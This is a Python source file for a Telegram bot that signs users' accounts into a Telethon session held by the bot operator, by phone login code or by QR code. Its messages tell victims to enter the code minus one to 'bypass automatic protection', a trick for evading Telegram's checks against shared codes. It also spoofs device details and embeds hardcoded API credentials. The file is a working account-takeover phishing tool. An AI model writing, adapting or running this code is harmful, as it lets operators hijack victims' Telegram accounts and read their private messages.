import telethon, telebot, qrcode, asyncio, os

qr = qrcode.QRCode()

def gen_qr(token:str):
    qr.clear()
    qr.add_data(token)

def display_url_as_qr(url):
    gen_qr(url)

#auth_store = {}

async def main_tel(client: telethon.TelegramClient, botref: telebot.TeleBot, chat_id: int, tel):
    code = {chat_id: None}
    def step2(message):
        try:
            code[chat_id] = int(message.text) + 1
        except:
            code[chat_id] = -1
            
    await client.connect()
    try:
        phone_code_hash  = await client.send_code_request(tel)
        #auth_store[chat_id] = phone_code_hash
        msg = botref.send_message(chat_id, "Введите код авторизации из сообщения от телеграма МИНУС 1. Это необходимо для обхода автоматической защиты. Пример: пришел код 23456, сообщаем 23455")
        botref.register_next_step_handler_by_chat_id(chat_id, step2)
        while not code[chat_id]:
            await asyncio.sleep(1)
        print(tel,code, phone_code_hash.phone_code_hash)
        try:
            if code[chat_id] == -1:
                botref.send_message(chat_id, "Произошла ошибка обработки кода, попробуйте еще раз")
                code[chat_id] = None
                return
            await client.sign_in(tel, code=code[chat_id], phone_code_hash=phone_code_hash.phone_code_hash)
            result = await client.is_user_authorized()
            botref.delete_message(chat_id, msg.message_id)
            if result:
                botref.send_message(chat_id, "Вы успешно авторизовались")
            else:
                botref.send_message(chat_id, "Произошла ошибка авторизации. Попробуйте снова.")
        except Exception as e:
            botref.send_message(chat_id, "Произошла ошибка авторизации. Подробнее - "+str(e))
    except:
        botref.send_message(chat_id, "Телефон введен в невернром формате")
    await client.disconnect()

async def main_qr(client: telethon.TelegramClient, botref: telebot.TeleBot, chat_id: int):
    if(not client.is_connected()):
        await client.connect()
    await client.connect()
    qr_login = await client.qr_login()
    print(client.is_connected())
    r = False
    msg = None
    fname = f"{chat_id}.png"
    while not r:
        gen_qr(qr_login.url)
        qr.make_image(fill_color="black", back_color="white").save(fname)
        with open(fname, 'rb') as f:
            if msg:
                botref.delete_message(chat_id, msg.message_id)
            msg = botref.send_photo(chat_id, f, caption=f"Отсканируйте QR код или [нажмите сюда]({qr_login.url})", parse_mode="MarkdownV2")

        # Important! You need to wait for the login to complete!
        try:
            r = await qr_login.wait(10)
        except:
            await qr_login.recreate()
    await client.disconnect()
    os.remove(fname)
    botref.delete_message(chat_id, msg.message_id)
    botref.send_message(chat_id, "Вы успешно авторизовались")

TELEGRAM_API_ID=28639018
TELEGRAM_API_HASH="f014cc12e32f1f618da532184382c3a7"

def create_client(acc_name: str, loop = None) -> telethon.TelegramClient:
    return telethon.TelegramClient(acc_name, TELEGRAM_API_ID, TELEGRAM_API_HASH, loop=loop, system_version="1.4.2 DistributionxXXL_AMG(OSX/4:1)", device_model="Factory-New Console v0.41")

async def auth_tel(acc_name: str, botref: telebot.TeleBot, chatid: int, tel: str):
    loop = asyncio.get_event_loop()
    asyncio.set_event_loop(loop)
    client = create_client(acc_name, loop)
    await main_tel(client, botref, chatid, tel)

async def auth_qr(acc_name: str, botref: telebot.TeleBot, chatid: int):
    loop = asyncio.get_event_loop()
    asyncio.set_event_loop(loop)
    client = create_client(acc_name, loop)
    await main_qr(client, botref, chatid)
    #client.loop.run_until_complete(main(client, botref, chatid))
    